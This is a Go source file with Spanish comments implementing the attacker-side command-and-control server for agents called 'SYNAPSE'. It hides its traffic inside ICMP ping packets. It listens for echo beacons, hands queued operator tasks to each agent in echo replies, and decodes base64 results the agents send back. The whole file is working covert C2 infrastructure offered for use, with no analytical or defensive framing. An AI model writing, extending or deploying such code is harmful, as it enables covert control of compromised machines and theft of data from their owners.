// FICHERO: c2.go (VERSIÓN CON ESTRUCTURA CORREGIDA)
package main

import (
	"bufio"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	//"net"
	"os"
	"strings"
	"sync"

	"github.com/spf13/cobra"
	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

// --- TIPOS DE DATOS Y BASE DE DATOS DE TAREAS (sin cambios) ---
type TaskDB struct {
	mu    sync.Mutex
	tasks map[string]string
}

func NewTaskDB() *TaskDB {
	return &TaskDB{tasks: make(map[string]string)}
}
func (db *TaskDB) GetTask(agentID string) string {
	db.mu.Lock(); defer db.mu.Unlock()
	task, ok := db.tasks[agentID]
	if ok {
		delete(db.tasks, agentID)
		return task
	}
	return "none"
}
func (db *TaskDB) AddTask(agentID, taskJSON string) {
	db.mu.Lock(); defer db.mu.Unlock()
	db.tasks[agentID] = taskJSON
	log.Printf("[C2] Nueva tarea añadida para el agente '%s': %s", agentID, taskJSON)
}

// --- LÓGICA DE LOS COMANDOS (CORREGIDA) ---

// NewC2Cmd crea el comando padre 'c2'.
func NewC2Cmd() *cobra.Command {
	// 1. El comando padre 'c2' NO debe tener una función 'Run'.
	// Es solo un punto de entrada para agrupar sus subcomandos.
	cmd := &cobra.Command{
		Use:   "c2",
		Short: "Inicia servidores de Mando y Control (C2) para los agentes",
		Long:  "Contiene los componentes del lado del atacante para comunicarse con los agentes SYNAPSE.",
	}

	// 2. Le añadimos sus subcomandos.
	cmd.AddCommand(newListenICMPCmd())
	// Futuro: cmd.AddCommand(newListenDNSCmd())
	
	return cmd
}

// newListenICMPCmd crea el subcomando 'c2 listen-icmp'.
func newListenICMPCmd() *cobra.Command {
	// Este comando SÍ tiene una función 'Run', porque es el que hace el trabajo.
	cmd := &cobra.Command{
		Use:   "listen-icmp",
		Short: "Inicia un servidor C2 que se comunica a través de paquetes ICMP (ping)",
		Long: `Escucha el tráfico ICMP en la máquina local. Responde a los beacons de los
agentes y les envía tareas. Requiere privilegios de root/Administrador.`,
		Run: func(cmd *cobra.Command, args []string) {
			runICMPC2Server()
		},
	}
	// Este comando no necesita flags, por lo que no definimos ninguno.
	return cmd
}

func runICMPC2Server() {
	taskDB := NewTaskDB()

	// Iniciar la goroutine para la interfaz de tareas (sin cambios)
	go func() {
		reader := bufio.NewReader(os.Stdin)
		fmt.Println("[C2] Interfaz de tareas iniciada. Formato: <agent_id> <comando> <args...>")
		fmt.Println(`[C2] Ejemplo: synapse01 scan 127.0.0.1 80,443`)
		for {
			fmt.Print("(C2 Task) > ")
			input, _ := reader.ReadString('\n')
			parts := strings.Fields(input)
			if len(parts) < 2 {
				fmt.Println("Formato incorrecto.")
				continue
			}
			agentID := parts[0]; command := parts[1]; args := parts[2:]
			task := CommandRequest{Comando: command, Args: args}
			taskJSON, _ := json.Marshal(task)
			taskDB.AddTask(agentID, string(taskJSON))
		}
	}()

	// Lógica del listener ICMP (sin cambios)
	conn, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
	if err != nil {
		log.Fatalf("Error fatal al iniciar el listener ICMP. ¿Se está ejecutando con privilegios?: %v", err)
	}
	defer conn.Close()
	log.Println("[C2] Servidor ICMP C2 activo. Esperando beacons...")

	for {
		rb := make([]byte, 1500)
		n, peer, err := conn.ReadFrom(rb)
		if err != nil {
			log.Printf("Error leyendo paquete ICMP: %v", err)
			continue
		}
		msg, err := icmp.ParseMessage(1, rb[:n])
		if err != nil { continue }
		if msg.Type == ipv4.ICMPTypeEcho {
			echoReq, ok := msg.Body.(*icmp.Echo)
			if !ok { continue }

			// El payload ahora puede tener 3 partes: <id>:<comando>:<datos_b64>
			payload := string(echoReq.Data)
			parts := strings.SplitN(payload, ":", 3)
			if len(parts) < 2 { continue }

			agentID := parts[0]; command := parts[1]

			switch command {
			case "task":
				log.Printf("\n[C2] Beacon [TASK] recibido de '%s' en %s", agentID, peer)
				task := taskDB.GetTask(agentID)
				responsePayload := []byte(agentID + ":" + task)
				reply := icmp.Message{
					Type: ipv4.ICMPTypeEchoReply, Code: 0,
					Body: &icmp.Echo{ID: echoReq.ID, Seq: echoReq.Seq, Data: responsePayload},
				}
				replyBytes, _ := reply.Marshal(nil)
				conn.WriteTo(replyBytes, peer)
				log.Printf("    -> Tarea enviada: %s", task)
			
			case "result":
				log.Printf("\n[C2] Beacon [RESULT] recibido de '%s' en %s", agentID, peer)
				if len(parts) > 2 {
					resultB64 := parts[2]
					result, err := base64.URLEncoding.DecodeString(resultB64)
					if err == nil {
						fmt.Printf("    -> Resultado (decodificado):\n---\n%s\n---\n", string(result))
					}
				}
			}
		}
	}
}